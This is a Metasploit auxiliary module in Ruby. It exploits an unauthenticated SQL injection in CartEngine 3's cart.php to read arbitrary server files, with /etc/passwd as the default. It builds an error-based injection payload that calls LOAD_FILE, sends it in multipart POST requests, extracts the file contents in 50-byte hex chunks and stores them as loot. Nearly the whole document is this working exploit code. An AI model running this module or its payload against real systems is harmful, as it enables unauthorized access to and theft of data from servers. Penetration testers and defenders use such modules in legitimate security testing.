##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CartEngine 3 Unauthenticated Arbitrary File Read',
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection in order to attempt
      reading an arbitrary file from the file system. A slightly misconfigured
      MySQL user is required in that the MySQL user must have FILE permissions.
      },
      'References'     =>
        [
          [ 'EDB', 'http://www.exploit-db.com/exploits/34764/' ]
        ],
      'Author'         =>
        [
          'bperry'
        ],
      'License'        => 'ExploitHub',
      'DisclosureDate' => "Aug 25 2013"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to CartEngine', '/']),
        OptString.new('FILEPATH', [true, 'The path to the file on the filesystem', '/etc/passwd'])
      ], self.class)
  end

  def do_sqli(msg)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cart.php'),
      'method' => 'POST',
      'ctype' => 'multipart/form-data; boundary=' + msg.bound,
      'data' => msg.to_s
    })

    res.body
  end

  def build_msg(query)
    msg = Rex::MIME::Message.new
    msg.add_part('', nil, nil, 'form-data; name="AXSRF_token"')
    msg.add_part('add', nil, nil, 'form-data; name="cmd"')
    msg.add_part(query, nil, nil, 'form-data; name="item_id[0]"')
    msg.add_part('1', nil, nil, 'form-data; name="qty[0]"')

    msg
  end

  def run

    left_marker = "fdsa"
    right_marker = "fdsa"
    compare = "rewq"

    file = datastore['FILEPATH'].unpack("H*")[0]

    data = ''
    i = 0
    while true
      query = "1' AND (SELECT 7345 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
      query << ",(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{file})) AS CHAR)"
      query << ",0x20)),#{i*50+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM "
      query << "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

      msg = build_msg(query)
      body = do_sqli(msg)

      data << [$1].pack("H*") if body =~ /#{left_marker}(.*)#{right_marker}/

      break if $1 == ''

      i = i + 1
    end

    path = store_loot('cartengine.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status("File saved to #{path}")

  end
end

